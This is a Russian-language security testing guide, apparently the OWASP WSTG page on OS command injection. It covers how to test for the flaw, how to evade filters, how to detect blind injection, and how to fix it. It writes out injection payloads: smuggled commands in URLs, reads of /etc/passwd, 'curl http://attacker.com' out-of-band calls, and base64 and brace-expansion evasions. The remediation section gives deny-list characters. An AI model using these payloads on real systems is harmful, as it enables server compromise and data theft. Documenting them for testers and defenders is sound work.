    Внедрение команд¶

    ID
    WSTG-INJT-12

    Резюме¶

    В этой статье описывается методика тестирования приложения на наличие уязвимости внедрения команд операционной системы (OS Command Injection). Задача тестировщика — попытаться внедрить команду ОС через входящий HTTP-запрос к приложению.

    Внедрение команд операционной системы (OS Command Injection) возникает в тех случаях, когда пользовательский ввод напрямую передается в системную командную строку без надлежащей валидации или санитизации. Это позволяет злоумышленнику внедрять и исполнять произвольные команды на сервере, что может привести к несанкционированному доступу к данным, их повреждению и полной компрометации сервера. Данную уязвимость можно предотвратить, уделяя первостепенное внимание безопасности на этапах проектирования и разработки приложений.

    Цели тестирования¶

    • Идентифицировать и оценить точки внедрения команд операционной системы.
    • Обойти фильтрацию специальных символов и команд ОС.

    Методика тестирования¶

    При просмотре файлов в веб-приложении имя файла часто передается в URL. Например, Perl позволяет передавать данные из процесса в команду открытия файла через конвейер (pipe). Пользователь может просто добавить символ пайпа | в конец имени файла.

    Пример исходного URL:

    https://sensitive/cgi-bin/userData.pl?doc=user1.txt

    Пример модифицированного URL:

    https://sensitive/cgi-bin/userData.pl?doc=user1.txt|/bin/ls

    Это приведет к исполнению команды /bin/ls.

    Добавление точки с запятой в конец URL для PHP-страницы с последующей системной командой также вызовет ее выполнение. Символ %3B представляет собой URL-кодированную точку с запятой.

    Пример:

    https://sensitive/something.php?dir=%3Bcat%20/etc/passwd

    Специальные символы для внедрения команд¶

    Специальные символы используются для объединения нескольких команд в одну цепочку. Набор этих символов различается в зависимости от операционной системы, под управлением которой работает веб-сервер. Например, следующие типы сцепления команд поддерживаются как в Windows, так и в Unix-подобных системах:

    • cmd1|cmd2 : cmd2 будет выполнена вне зависимости от успешности завершения cmd1.
    • cmd1||cmd2 : cmd2 выполнится только в случае аварийного завершения (ошибки) cmd1.
    • cmd1&&cmd2 : cmd2 выполнится только в случае успешного завершения cmd1.
    • cmd1&cmd2 : cmd2 выполнится независимо от результата выполнения cmd1.

    Точка с запятой ; поддерживается в Unix-подобных системах и PowerShell. Однако она не работает в классической командной строке Windows (CMD).
    Кроме того, в Unix-системах для выполнения команд можно использовать механизм подстановки команд Bash: $(cmd) или `cmd`.
    Также могут применяться дескрипторы файлов Linux, такие как >(cmd) и <(cmd).

    Дополнительные техники внедрения команд ОС¶

    В зависимости от рабочего окружения и реализованных механизмов фильтрации атакующие могут использовать различные техники выполнения команд ОС.

    Подстановка команд¶

    Подстановка команд (Command substitution) позволяет передавать вывод одной команды в качестве аргумента другой команде.

    Примеры:

    $(whoami)
`whoami`

    Объединение команд в цепочки¶

    Объединение команд в цепочки (Command chaining) позволяет выполнять несколько команд последовательно с помощью операторов сцепления.

    Примеры:

    cmd1 ; cmd2
cmd1 && cmd2
cmd1 || cmd2

    Перенаправление файлов¶

    Перенаправление файлов (File redirection) позволяет сохранять вывод выполненной команды в файлы, доступные через веб-сервер.

    Пример:

    whoami > /var/www/html/output.txt

    Внеполосная инъекция команд¶

    Внеполосное внедрение команд (Out-of-band command injection, OOB) предполагает использование внешних сервисов для подтверждения факта выполнения команды.

    Примеры:

    curl http://attacker.com
nslookup attacker.com

    Обход фильтров¶

    Для защиты от внедрения команд операционной системы разработчики часто используют фильтры. Однако эти механизмы нередко реализуются некорректно, что позволяет злоумышленникам обойти их (Filter evasion). В этом разделе рассматриваются различные техники обхода подобных фильтров.

    Методология¶

    Прежде всего, перед попыткой обхода фильтра необходимо сформировать базовое понимание принципов его работы. При анализе обнаруженного фильтра рекомендуется ответить на следующие вопросы:

    • Реализован ли фильтр на стороне клиента или сервера?
    • Применяется ли фильтрация к специальным символам, командам ОС или к обоим типам сущностей?
    • Использует ли веб-приложение список разрешений (allowlist) или список блокировок (blocklist)?
    • Какая операционная система установлена на сервере? Это определяет набор доступных команд и управляющих символов.

    Обход фильтров специальных символов¶

    Как уже отмечалось, фильтрация может накладываться на спецсимволы, команды ОС или на то и другое. Для обхода ограничений на спецсимволы можно использовать переменные окружения, раскрытие фигурных скобок в Bash или URL-кодирование.

    URL-кодирование¶

    URL-кодирование спецсимволов позволяет обойти фильтр, если веб-сервер проверяет входящие данные только на наличие открытых текстовых символов. Ниже приведены примеры некоторых спецсимволов и их URL-представление:

    Special Character URL Encoding
    ; %3b
    space %20
    tab %09
    & %26
    New line %0a

    Например, вместо передачи ;whoami можно отправить %3bwhoami.

    Переменные окружения¶

    Такие специальные символы, как пробел, точка с запятой, табуляция или перевод строки, обычно фильтруются веб-сервером, особенно если они не предусмотрены бизнес-логикой поля.
    Для обхода этих ограничений можно использовать переменные окружения, такие как IFS, PATH или LS_COLORS в Linux, а также HOMEPATH в Windows.
    Например, в Linux символы /, ; и [space] можно заменить соответственно на ${PATH:0:1}, ${LS_COLORS:10:1} и ${IFS}.
    В командной строке Windows CMD символ \ заменяется на %HOMEPATH:~6,1%, а в PowerShell — на $env:HOMEPATH[0].

    Раскрытие фигурных скобок в Bash (Brace Expansion)¶

    Раскрытие фигурных скобок (Bash brace expansion) — это возможность оболочки Bash, позволяющая вызывать команды с помощью фигурных скобок.
    Например, конструкция {ls,-la} приведет к исполнению команды ls -la. Это исключительно полезно, если сервер фильтрует пробелы, переводы строк или символы табуляции.
    Предположим, требуется прочитать содержимое файла '/etc/passwd'. Вместо конструкции ;cat /etc/passwd можно передать ;{cat,/etc/passwd}.
    При этом важно учитывать, что данная техника сработает только в среде Bash и при условии, что символы }{/,; не блокируются фильтром.

    Обход фильтров команд¶

    В данном подразделе рассматриваются методы обхода фильтрации, нацеленной на блокировку конкретных системных команд.

    Изменение регистра символов¶

    Модификация регистра символов (Case modification) применяется для обхода фильтрации команд ОС, чувствительной к регистру.
    Если при тестировании выясняется, что веб-сервер блокирует команду ;whoami, можно передать ;WhoAmi. Если фильтр проверяет строки только в нижнем регистре, это позволит успешно обойти проверку.
    Данная методика, как правило, применима к системам под управлением Windows.
    В Linux используется техника динамического преобразования символов (character shifting). Например, приведенная ниже команда переводит символы верхнего регистра в нижний перед исполнением:

    ;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")

    Вставка символов¶

    В команды Linux можно вставлять такие символы, как \, $@, ', без нарушения логики их исполнения.
    Например, команды who\ami, w$@hoami и wh'o'ami приведут к выполнению команды whoami.

    Примечание: количество одинарных кавычек ' в Linux-команде должно быть четным, иначе возникнет синтаксическая ошибка. При работе с Windows CMD вместо них следует использовать двойные кавычки ".
    Кроме того, в командах CMD можно использовать символ вставки ^. Например, whoa^mi выполнит команду whoami. В PowerShell данный прием не работает.

    Кодирование Base64¶

    В ряде сценариев веб-сервер блокирует имена утилит, такие как whoami, id и т. д.
    Предположим, что вызов whoami заблокирован, и мы не можем использовать пейлоад ;whoami.
    Для обхода этого ограничения преобразуем команду whoami в Base64 с помощью команды: echo -n 'whoami' | base64, которая вернет значение d2hvYW1p.
    Затем передадим в уязвимый параметр следующий пейлоад: ;bash<<<$(base64 -d<<< d2hvYW1p). Это позволит обойти фильтр на стороне сервера и добиться выполнения произвольной команды.

    Наконец, следует помнить, что для успешного обхода фильтрации на веб-сервере зачастую требуется комбинировать различные техники обхода фильтров спецсимволов и команд ОС.

    Слепое внедрение команд¶

    В определенных случаях вывод внедренной команды не возвращается в HTTP-ответе веб-сервера. В такой ситуации необходимо подтвердить факт выполнения инъекции альтернативными путями. Для этого можно задействовать подконтрольные тестировщику внешние серверы, работающие по протоколам HTTP, DNS или SMTP.
    Также можно использовать команды системных задержек времени (time-delay), такие как sleep (Linux), timeout (Windows) или утилиту сетевой диагностики ping.
    Например, внедрив пейлоад ;sleep(5), при наличии задержки ответа сервера в 5 секунд мы подтверждаем наличие слепой инъекции команд (Blind Command Injection).
    Кроме того, можно перенаправить вывод команды в общедоступный каталог веб-сервера (web root): ;whoami>/var/www/html/poc.txt;.
    Затем отправляется запрос: curl http://website.com/poc.txt. Если файл успешно извлекается, факт наличия уязвимости считается подтвержденным.

    Рекомендации по устранению¶

    Очистка данных (Sanitization)¶

    Параметры URL-запросов и данные HTML-форм необходимо валидировать и санитизировать, чтобы предотвратить внедрение вредоносных символов.
    Использование списков запрещенных символов (blocklist) допустимо, однако предусмотреть все опасные символы на практике крайне трудно, особенно с учетом новых векторов атак.
    Для проверки пользовательского ввода следует применять списки разрешений (allowlist), содержащие только легитимные символы или допустимый набор команд. Все не входящие в список символы и потенциальные угрозы должны отсекаться.

    Базовый список блокировки (deny list) для защиты от command injection включает следующие символы: | ; & $ > < ' \ ! >> #

    Экранирование или фильтрация специальных символов для Windows: ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . " % @ / \ : + , `

    Экранирование или фильтрация специальных символов для Linux: { } ( ) > < & * ‘ | = ? ; [ ] $ - # ~ ! . " % / \ : + , `

    Кроме того, избегайте вызова функций, исполняющих команды операционной системы, за исключением случаев крайней необходимости. Например, вместо выполнения system("cp /path/to/file1.txt /path/to/file2.txt") для копирования файла следует напрямую использовать встроенную функцию PHP copy("/path/to/file1.txt", "/path/to/file2.txt"), которая решает ту же задачу безопасным путем. Большинство современных языков и фреймворков предоставляют аналогичные встроенные средства работы с системой.

    Права доступа¶

    Веб-приложение и его рабочие компоненты должны функционировать с минимально необходимыми привилегиями, исключающими выполнение команд уровня ОС. В рамках тестирования методом «серого ящика» необходимо детально проверить конфигурацию прав учетных записей процессов.
